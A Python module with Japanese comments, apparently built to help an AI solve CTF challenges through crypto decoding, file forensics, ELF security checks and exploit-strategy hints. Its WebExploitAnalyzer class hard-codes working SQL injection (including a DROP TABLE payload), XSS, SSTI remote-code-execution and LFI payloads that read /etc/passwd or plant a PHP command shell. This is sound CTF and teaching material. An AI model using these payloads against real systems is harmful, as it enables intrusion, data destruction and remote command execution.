"""
CTF Intelligence Module - CTF問題解決のための知能モジュール

このモジュールはAIがCTF問題をより賢く解くための分析ツールを提供します:
- CryptoAnalyzer: 暗号解析機能
- ForensicsAnalyzer: フォレンジック解析機能
- WebExploitAnalyzer: Web脆弱性解析機能
- PwnAnalyzer: Pwn解析機能
"""

import asyncio
import sys
import re
import base64
import codecs
import hashlib
import struct
from typing import Optional, List, Dict, Tuple
from collections import Counter


class CryptoAnalyzer:
    """暗号解析クラス - 暗号文の自動識別と解読支援"""

    # よくあるハッシュパターン
    HASH_PATTERNS = {
        'md5': (r'^[a-fA-F0-9]{32}$', 'MD5'),
        'sha1': (r'^[a-fA-F0-9]{40}$', 'SHA-1'),
        'sha256': (r'^[a-fA-F0-9]{64}$', 'SHA-256'),
        'sha512': (r'^[a-fA-F0-9]{128}$', 'SHA-512'),
        'ntlm': (r'^[a-fA-F0-9]{32}$', 'NTLM (or MD5)'),
        'mysql': (r'^\*[a-fA-F0-9]{40}$', 'MySQL 4.1+'),
        'bcrypt': (r'^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$', 'bcrypt'),
        'sha512crypt': (r'^\$6\$[a-zA-Z0-9./]+\$[a-zA-Z0-9./]{86}$', 'SHA-512 Crypt'),
    }

    # 英語の文字頻度（解読確認用）
    ENGLISH_FREQ = {
        'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0, 'n': 6.7,
        's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3, 'l': 4.0, 'c': 2.8,
        'u': 2.8, 'm': 2.4, 'w': 2.4, 'f': 2.2, 'g': 2.0, 'y': 2.0,
        'p': 1.9, 'b': 1.5, 'v': 1.0, 'k': 0.8, 'j': 0.15, 'x': 0.15,
        'q': 0.10, 'z': 0.07
    }

    async def analyze_text(self, text: str) -> str:
        """テキストを分析し、暗号化方式を推定"""
        results = ["=== 暗号文分析結果 ===\n"]
        text = text.strip()

        # 1. Base64チェック
        base64_result = self._check_base64(text)
        if base64_result:
            results.append(f"✅ Base64検出: {base64_result}")

        # 2. Hexチェック
        hex_result = self._check_hex(text)
        if hex_result:
            results.append(f"✅ Hex検出: {hex_result}")

        # 3. ROT13/Caesar チェック
        if text.isalpha() or (text.replace(' ', '').isalpha()):
            rot13_result = self._decode_rot13(text)
            results.append(f"📝 ROT13デコード: {rot13_result}")
            caesar_results = self._try_caesar(text)
            results.append(f"📝 シーザー暗号候補:\n{caesar_results}")

        # 4. ハッシュ識別
        hash_type = self._identify_hash(text)
        if hash_type:
            results.append(f"🔐 ハッシュタイプ: {hash_type}")

        # 5. URL Safe Base64
        if '_' in text or '-' in text:
            urlsafe_result = self._check_urlsafe_base64(text)
            if urlsafe_result:
                results.append(f"✅ URL-Safe Base64検出: {urlsafe_result}")

        # 6. Binary/Octal チェック
        if set(text.replace(' ', '')) <= {'0', '1'}:
            binary_result = self._decode_binary(text)
            if binary_result:
                results.append(f"✅ バイナリデコード: {binary_result}")

        if not any('✅' in r for r in results):
            results.append("⚠️ 自動識別できませんでした。手動分析が必要です。")
            results.append("\n💡 ヒント:")
            results.append("- 文字の頻度分析を試してください")
            results.append("- XOR暗号の可能性を検討してください")
            results.append("- Vigenere暗号の可能性を検討してください")

        return "\n".join(results)

    def _check_base64(self, text: str) -> Optional[str]:
        """Base64エンコードかチェック"""
        try:
            # パディング調整
            padding = 4 - len(text) % 4
            if padding != 4:
                text += '=' * padding
            decoded = base64.b64decode(text).decode('utf-8', errors='ignore')
            if decoded and len(decoded) > 0 and all(c.isprintable() or c.isspace() for c in decoded):
                return decoded[:200] + ('...' if len(decoded) > 200 else '')
        except:
            pass
        return None

    def _check_urlsafe_base64(self, text: str) -> Optional[str]:
        """URL-safe Base64エンコードかチェック"""
        try:
            padding = 4 - len(text) % 4
            if padding != 4:
                text += '=' * padding
            decoded = base64.urlsafe_b64decode(text).decode('utf-8', errors='ignore')
            if decoded and all(c.isprintable() or c.isspace() for c in decoded):
                return decoded[:200] + ('...' if len(decoded) > 200 else '')
        except:
            pass
        return None

    def _check_hex(self, text: str) -> Optional[str]:
        """Hexエンコードかチェック"""
        clean_text = text.replace(' ', '').replace('0x', '').replace('\n', '')
        if len(clean_text) % 2 == 0 and all(c in '0123456789abcdefABCDEF' for c in clean_text):
            try:
                decoded = bytes.fromhex(clean_text).decode('utf-8', errors='ignore')
                if decoded and all(c.isprintable() or c.isspace() for c in decoded):
                    return decoded[:200] + ('...' if len(decoded) > 200 else '')
            except:
                pass
        return None

    def _decode_rot13(self, text: str) -> str:
        """ROT13デコード"""
        return codecs.decode(text, 'rot_13')

    def _try_caesar(self, text: str) -> str:
        """シーザー暗号を全シフトで試行"""
        results = []
        text_lower = text.lower()
        for shift in range(1, 26):
            decoded = ""
            for char in text_lower:
                if char.isalpha():
                    decoded += chr((ord(char) - ord('a') - shift) % 26 + ord('a'))
                else:
                    decoded += char
            # 英語らしさスコアを計算
            score = self._english_score(decoded)
            results.append((shift, decoded[:50], score))

        # スコア順にソート
        results.sort(key=lambda x: x[2], reverse=True)
        output = []
        for shift, decoded, score in results[:5]:
            output.append(f"  シフト{shift:2d}: {decoded}... (スコア: {score:.2f})")
        return "\n".join(output)

    def _english_score(self, text: str) -> float:
        """テキストの英語らしさスコアを計算"""
        text = text.lower()
        total = sum(1 for c in text if c.isalpha())
        if total == 0:
            return 0
        score = 0
        for char, expected_freq in self.ENGLISH_FREQ.items():
            actual_freq = text.count(char) / total * 100
            score += min(actual_freq, expected_freq)
        return score

    def _identify_hash(self, text: str) -> Optional[str]:
        """ハッシュタイプを識別"""
        text = text.strip()
        for hash_name, (pattern, description) in self.HASH_PATTERNS.items():
            if re.match(pattern, text):
                return description
        return None

    def _decode_binary(self, text: str) -> Optional[str]:
        """バイナリ文字列をデコード"""
        try:
            clean = text.replace(' ', '')
            if len(clean) % 8 != 0:
                return None
            chars = [chr(int(clean[i:i+8], 2)) for i in range(0, len(clean), 8)]
            decoded = ''.join(chars)
            if all(c.isprintable() or c.isspace() for c in decoded):
                return decoded
        except:
            pass
        return None

    async def xor_analyze(self, data: bytes, key_length: int = 1) -> str:
        """XOR暗号の解析（単一バイトキー）"""
        results = ["=== XOR暗号分析 ===\n"]

        if key_length == 1:
            for key in range(256):
                decoded = bytes([b ^ key for b in data])
                try:
                    text = decoded.decode('utf-8', errors='strict')
                    if all(c.isprintable() or c.isspace() for c in text):
                        score = self._english_score(text)
                        if score > 30:
                            results.append(f"キー 0x{key:02x}: {text[:100]}... (スコア: {score:.2f})")
                except:
                    pass

        if len(results) == 1:
            results.append("⚠️ 単一バイトXORでは解読できませんでした")

        return "\n".join(results)


class ForensicsAnalyzer:
    """フォレンジック解析クラス - ファイル解析とデータ抽出"""

    # マジックバイトデータベース
    MAGIC_BYTES = {
        b'\x89PNG\r\n\x1a\n': 'PNG Image',
        b'\xff\xd8\xff': 'JPEG Image',
        b'GIF87a': 'GIF Image (87a)',
        b'GIF89a': 'GIF Image (89a)',
        b'%PDF': 'PDF Document',
        b'PK\x03\x04': 'ZIP Archive (or Office Document)',
        b'PK\x05\x06': 'ZIP Archive (empty)',
        b'\x1f\x8b\x08': 'GZIP Compressed',
        b'BZ': 'BZIP2 Compressed',
        b'\x7fELF': 'ELF Executable',
        b'MZ': 'Windows Executable (PE)',
        b'\xca\xfe\xba\xbe': 'Mach-O Binary (Universal)',
        b'\xfe\xed\xfa\xce': 'Mach-O Binary (32-bit)',
        b'\xfe\xed\xfa\xcf': 'Mach-O Binary (64-bit)',
        b'Rar!\x1a\x07': 'RAR Archive',
        b'\x00\x00\x00\x1c\x66\x74\x79\x70': 'MP4 Video',
        b'RIFF': 'WAV/AVI File',
        b'OggS': 'OGG Audio',
        b'ID3': 'MP3 Audio',
        b'\xff\xfb': 'MP3 Audio',
        b'SQLite format 3': 'SQLite Database',
    }

    # CTFでよく使われる隠しパターン
    CTF_PATTERNS = [
        (rb'flag\{[^}]+\}', 'Flag format: flag{...}'),
        (rb'CTF\{[^}]+\}', 'Flag format: CTF{...}'),
        (rb'picoCTF\{[^}]+\}', 'Flag format: picoCTF{...}'),
        (rb'HTB\{[^}]+\}', 'Flag format: HTB{...}'),
        (rb'SECCON\{[^}]+\}', 'Flag format: SECCON{...}'),
        (rb'[A-Za-z0-9+/]{20,}={0,2}', 'Possible Base64'),
        (rb'(?:[0-9a-fA-F]{2}\s*){16,}', 'Possible Hex data'),
        (rb'-----BEGIN [A-Z ]+-----', 'PEM formatted data'),
        (rb'ssh-rsa [A-Za-z0-9+/]+', 'SSH Public Key'),
    ]

    async def analyze_file(self, file_path: str) -> str:
        """ファイルの詳細分析"""
        results = ["=== ファイルフォレンジック分析 ===\n"]

        try:
            with open(file_path, 'rb') as f:
                data = f.read()
        except Exception as e:
            return f"エラー: ファイルを読み込めません - {str(e)}"

        # 1. ファイルサイズ
        results.append(f"📁 ファイルサイズ: {len(data):,} bytes")

        # 2. マジックバイト識別
        file_type = self._identify_file_type(data)
        results.append(f"📋 検出ファイルタイプ: {file_type}")

        # 3. エントロピー計算
        entropy = self._calculate_entropy(data)
        results.append(f"📊 エントロピー: {entropy:.4f} (高い=暗号化/圧縮の可能性)")

        # 4. CTFパターン検索
        patterns_found = self._search_ctf_patterns(data)
        if patterns_found:
            results.append("\n🚩 CTF関連パターン検出:")
            for pattern, match in patterns_found:
                results.append(f"  - {pattern}: {match[:100]}...")

        # 5. 文字列抽出（重要なもののみ）
        strings = self._extract_strings(data, min_length=8)
        if strings:
            results.append(f"\n📝 抽出された文字列 (先頭20件):")
            for s in strings[:20]:
                results.append(f"  {s}")

        # 6. ファイル末尾チェック（追加データ）
        trailer_info = self._check_file_trailer(data, file_type)
        if trailer_info:
            results.append(f"\n⚠️ ファイル末尾情報: {trailer_info}")

        return "\n".join(results)

    def _identify_file_type(self, data: bytes) -> str:
        """マジックバイトからファイルタイプを識別"""
        for magic, file_type in self.MAGIC_BYTES.items():
            if data.startswith(magic):
                return file_type
        return "Unknown"

    def _calculate_entropy(self, data: bytes) -> float:
        """シャノンエントロピーを計算"""
        import math
        if len(data) == 0:
            return 0
        freq = Counter(data)
        entropy = 0
        for count in freq.values():
            p = count / len(data)
            entropy -= p * math.log2(p)
        return entropy

    def _search_ctf_patterns(self, data: bytes) -> List[Tuple[str, str]]:
        """CTF関連パターンを検索"""
        found = []
        for pattern, description in self.CTF_PATTERNS:
            matches = re.findall(pattern, data)
            for match in matches[:3]:  # 各パターン最大3件
                try:
                    found.append((description, match.decode('utf-8', errors='ignore')))
                except:
                    found.append((description, str(match)))
        return found

    def _extract_strings(self, data: bytes, min_length: int = 4) -> List[str]:
        """印刷可能文字列を抽出"""
        strings = []
        current = []
        for byte in data:
            if 32 <= byte < 127:
                current.append(chr(byte))
            else:
                if len(current) >= min_length:
                    strings.append(''.join(current))
                current = []
        if len(current) >= min_length:
            strings.append(''.join(current))
        return strings

    def _check_file_trailer(self, data: bytes, file_type: str) -> Optional[str]:
        """ファイル末尾に追加データがないかチェック"""
        if file_type == 'PNG Image':
            iend_pos = data.find(b'IEND')
            if iend_pos != -1:
                trailer_start = iend_pos + 8  # IEND + CRC
                if trailer_start < len(data):
                    extra = len(data) - trailer_start
                    return f"PNG IEND後に {extra} bytes の追加データあり（ステガノグラフィの可能性）"
        elif file_type == 'JPEG Image':
            eoi_pos = data.rfind(b'\xff\xd9')
            if eoi_pos != -1 and eoi_pos + 2 < len(data):
                extra = len(data) - eoi_pos - 2
                return f"JPEG EOI後に {extra} bytes の追加データあり"
        return None


class WebExploitAnalyzer:
    """Web脆弱性解析クラス - ペイロード生成と脆弱性検出支援"""

    # SQLインジェクションペイロード
    SQLI_PAYLOADS = [
        ("' OR '1'='1", "基本的な認証バイパス"),
        ("' OR '1'='1' --", "コメントでクエリ終了"),
        ("' OR '1'='1' /*", "ブロックコメント"),
        ("1' ORDER BY 1--+", "カラム数特定"),
        ("1' UNION SELECT NULL--", "UNION攻撃（1カラム）"),
        ("1' UNION SELECT NULL,NULL--", "UNION攻撃（2カラム）"),
        ("'; DROP TABLE users--", "破壊的ペイロード(テスト用)"),
        ("1' AND SLEEP(5)--", "時間ベースブラインド"),
        ("1' AND '1'='1", "ブーリアンベース"),
    ]

    # XSSペイロード
    XSS_PAYLOADS = [
        ("<script>alert(1)</script>", "基本的なスクリプト埋め込み"),
        ("<img src=x onerror=alert(1)>", "イメージエラーハンドラ"),
        ("<svg onload=alert(1)>", "SVGロードイベント"),
        ("\" onfocus=alert(1) autofocus=\"", "入力フィールド属性"),
        ("'><script>alert(1)</script>", "クォート脱出"),
        ("<body onload=alert(1)>", "ボディロードイベント"),
        ("javascript:alert(1)", "JavaScript URL"),
        ("<iframe src=\"javascript:alert(1)\">", "iframeインジェクション"),
    ]

    # SSTIペイロード
    SSTI_PAYLOADS = [
        ("{{7*7}}", "Jinja2/Twig検出", "49"),
        ("${7*7}", "Spring EL/Freemarker検出", "49"),
        ("<%= 7*7 %>", "ERB検出", "49"),
        ("#{7*7}", "Ruby検出", "49"),
        ("{{config}}", "Jinja2設定漏洩"),
        ("{{self.__class__.__mro__}}", "Jinja2 MRO探索"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Spring RCE"),
    ]

    # LFI/RFIペイロード
    LFI_PAYLOADS = [
        ("../../../etc/passwd", "基本的なパストラバーサル"),
        ("....//....//....//etc/passwd", "フィルターバイパス"),
        ("/etc/passwd%00", "NULLバイト（古いPHP）"),
        ("php://filter/convert.base64-encode/resource=index.php", "PHPフィルター"),
        ("php://input", "PHP入力ストリーム"),
        ("data://text/plain,<?php system($_GET['cmd']);?>", "DataラッパーRCE"),
        ("expect://id", "Expectラッパー"),
        ("file:///etc/passwd", "Fileプロトコル"),
    ]

    async def generate_payloads(self, vuln_type: str) -> str:
        """指定された脆弱性タイプのペイロードを生成"""
        vuln_type = vuln_type.lower()
        results = [f"=== {vuln_type.upper()} ペイロード一覧 ===\n"]

        if 'sql' in vuln_type:
            results.append("📝 SQLインジェクションペイロード:")
            for payload, desc in self.SQLI_PAYLOADS:
                results.append(f"  [{desc}]")
                results.append(f"  {payload}\n")

        elif 'xss' in vuln_type:
            results.append("📝 XSSペイロード:")
            for payload, desc in self.XSS_PAYLOADS:
                results.append(f"  [{desc}]")
                results.append(f"  {payload}\n")

        elif 'ssti' in vuln_type or 'template' in vuln_type:
            results.append("📝 SSTIペイロード:")
            for item in self.SSTI_PAYLOADS:
                if len(item) == 3:
                    payload, desc, expected = item
                    results.append(f"  [{desc}] 期待値: {expected}")
                else:
                    payload, desc = item
                    results.append(f"  [{desc}]")
                results.append(f"  {payload}\n")

        elif 'lfi' in vuln_type or 'rfi' in vuln_type or 'path' in vuln_type:
            results.append("📝 LFI/パストラバーサルペイロード:")
            for payload, desc in self.LFI_PAYLOADS:
                results.append(f"  [{desc}]")
                results.append(f"  {payload}\n")

        else:
            results.append("利用可能なタイプ: sql, xss, ssti, lfi")

        return "\n".join(results)

    async def suggest_tests(self, url: str) -> str:
        """URLに対する脆弱性テスト手順を提案"""
        results = ["=== Web脆弱性テスト提案 ===\n"]
        results.append(f"対象URL: {url}\n")

        results.append("1️⃣ パラメータ発見:")
        results.append("   - URLパラメータを特定")
        results.append("   - POSTボディパラメータを確認")
        results.append("   - Cookieの値を確認\n")

        results.append("2️⃣ SQLインジェクションテスト:")
        results.append("   - シングルクォートを追加してエラーを確認")
        results.append("   - UNION SELECTでカラム数を特定")
        results.append("   - sqlmapで自動化\n")

        results.append("3️⃣ XSSテスト:")
        results.append("   - 入力値が画面に反映されるか確認")
        results.append("   - <script>タグが動作するか確認")
        results.append("   - イベントハンドラが動作するか確認\n")

        results.append("4️⃣ パストラバーサルテスト:")
        results.append("   - ファイルパスを受け取るパラメータを特定")
        results.append("   - ../を追加してエラーを確認\n")

        results.append("5️⃣ SSTIテスト:")
        results.append("   - {{7*7}}を入力して49が表示されるか確認")
        results.append("   - ${7*7}も試行")

        return "\n".join(results)


class PwnAnalyzer:
    """Pwn解析クラス - バイナリ脆弱性分析とエクスプロイト支援"""

    async def analyze_binary_security(self, file_path: str) -> str:
        """バイナリのセキュリティ機能をチェック（checksec相当）"""
        results = ["=== バイナリセキュリティ分析 ===\n"]

        try:
            with open(file_path, 'rb') as f:
                data = f.read()
        except Exception as e:
            return f"エラー: ファイルを読み込めません - {str(e)}"

        # ELFチェック
        if not data.startswith(b'\x7fELF'):
            return "エラー: ELFファイルではありません"

        results.append(f"📁 ファイル: {file_path}")

        # アーキテクチャ検出
        arch = "32-bit" if data[4] == 1 else "64-bit"
        results.append(f"🔧 アーキテクチャ: {arch}")

        # PIE検出（簡易）
        if data[16:18] == b'\x03\x00':  # ET_DYN
            results.append("✅ PIE: 有効")
        else:
            results.append("❌ PIE: 無効")

        # NXビット検出（GNU_STACKの存在確認）
        if b'GNU_STACK' in data:
            results.append("✅ NX: 有効（スタック実行不可）")
        else:
            results.append("⚠️ NX: 確認が必要")

        # Canary検出（__stack_chk_failの存在確認）
        if b'__stack_chk_fail' in data:
            results.append("✅ Stack Canary: 有効")
        else:
            results.append("❌ Stack Canary: 無効（BOF脆弱の可能性）")

        # RELRO検出
        if b'RELRO' in data:
            results.append("✅ RELRO: 有効")
        else:
            results.append("⚠️ RELRO: 確認が必要")

        # 危険な関数の使用チェック
        dangerous_funcs = [
            (b'gets', 'gets() - バッファオーバーフロー脆弱'),
            (b'strcpy', 'strcpy() - バッファオーバーフロー可能'),
            (b'strcat', 'strcat() - バッファオーバーフロー可能'),
            (b'sprintf', 'sprintf() - バッファオーバーフロー可能'),
            (b'scanf', 'scanf() - バッファオーバーフロー可能'),
            (b'printf', 'printf() - フォーマット文字列脆弱性の可能性'),
        ]

        found_dangerous = []
        for func, desc in dangerous_funcs:
            if func in data:
                found_dangerous.append(desc)

        if found_dangerous:
            results.append("\n⚠️ 危険な関数の使用:")
            for desc in found_dangerous:
                results.append(f"  - {desc}")

        # シェルコード用情報
        results.append("\n📝 エクスプロイト開発情報:")
        if arch == "64-bit":
            results.append("  - システムコール: syscall")
            results.append("  - 引数レジスタ: rdi, rsi, rdx, r10, r8, r9")
        else:
            results.append("  - システムコール: int 0x80")
            results.append("  - 引数レジスタ: ebx, ecx, edx, esi, edi")

        return "\n".join(results)

    async def suggest_exploit_strategy(self, vuln_type: str) -> str:
        """脆弱性タイプに基づくエクスプロイト戦略を提案"""
        results = [f"=== {vuln_type} エクスプロイト戦略 ===\n"]

        vuln_type = vuln_type.lower()

        if 'bof' in vuln_type or 'buffer' in vuln_type or 'overflow' in vuln_type:
            results.append("📝 バッファオーバーフロー攻撃手順:")
            results.append("1. オフセットの特定 (pattern_create/pattern_offset)")
            results.append("2. リターンアドレスの制御確認")
            results.append("3. 適切なガジェット/シェルコードの準備")
            results.append("4. PIE有効時はアドレスリークが必要")
            results.append("5. Canary有効時はリーク or ブルートフォースが必要")
            results.append("\n💡 役立つツール: pwntools, gdb-peda, ropper")

        elif 'format' in vuln_type or 'fsb' in vuln_type:
            results.append("📝 フォーマット文字列攻撃手順:")
            results.append("1. %x, %p でスタック内容をリーク")
            results.append("2. バッファの位置を特定 (直接アクセス)")
            results.append("3. %n でメモリ書き込み")
            results.append("4. GOT overwrite または リターンアドレス書き換え")
            results.append("\n💡 ペイロード例: %N$p (N番目の引数を表示)")

        elif 'rop' in vuln_type:
            results.append("📝 ROP攻撃手順:")
            results.append("1. ガジェットの収集 (ropper, ROPgadget)")
            results.append("2. システムコールまたはret2libc構築")
            results.append("3. ペイロード作成とチェーン構築")
            results.append("\n💡 64-bit execve: rax=59, rdi=/bin/sh, rsi=0, rdx=0")

        elif 'heap' in vuln_type:
            results.append("📝 ヒープ攻撃手順:")
            results.append("1. ヒープレイアウトの理解")
            results.append("2. UAF, Double Free, Heap Overflowの特定")
            results.append("3. tcache/fastbin attackの検討")
            results.append("\n💡 役立つツール: gef, pwndbg")

        else:
            results.append("利用可能なタイプ: bof, format (fsb), rop, heap")

        return "\n".join(results)


# 統合クラス
class CTFIntelligence:
    """CTF Intelligence - 全分析機能を統合"""

    def __init__(self):
        self.crypto = CryptoAnalyzer()
        self.forensics = ForensicsAnalyzer()
        self.web = WebExploitAnalyzer()
        self.pwn = PwnAnalyzer()

    async def analyze_crypto(self, text: str) -> str:
        """暗号テキストを分析"""
        return await self.crypto.analyze_text(text)

    async def analyze_file(self, file_path: str) -> str:
        """ファイルをフォレンジック分析"""
        return await self.forensics.analyze_file(file_path)

    async def analyze_binary(self, file_path: str) -> str:
        """バイナリのセキュリティを分析"""
        return await self.pwn.analyze_binary_security(file_path)

    async def get_web_payloads(self, vuln_type: str) -> str:
        """Web脆弱性ペイロードを取得"""
        return await self.web.generate_payloads(vuln_type)

    async def get_exploit_strategy(self, vuln_type: str) -> str:
        """エクスプロイト戦略を取得"""
        return await self.pwn.suggest_exploit_strategy(vuln_type)

    async def get_status(self) -> str:
        """ステータスを取得"""
        return """=== CTF Intelligence Module Status ===

✅ CryptoAnalyzer: 有効
   - Base64/Hex/ROT13/Caesar自動検出
   - ハッシュタイプ識別
   - XOR暗号解析

✅ ForensicsAnalyzer: 有効
   - ファイルタイプ識別
   - エントロピー計算
   - CTFパターン検索
   - 追加データ検出

✅ WebExploitAnalyzer: 有効
   - SQLi/XSS/SSTI/LFI ペイロード生成

✅ PwnAnalyzer: 有効
   - バイナリセキュリティチェック
   - エクスプロイト戦略提案
"""
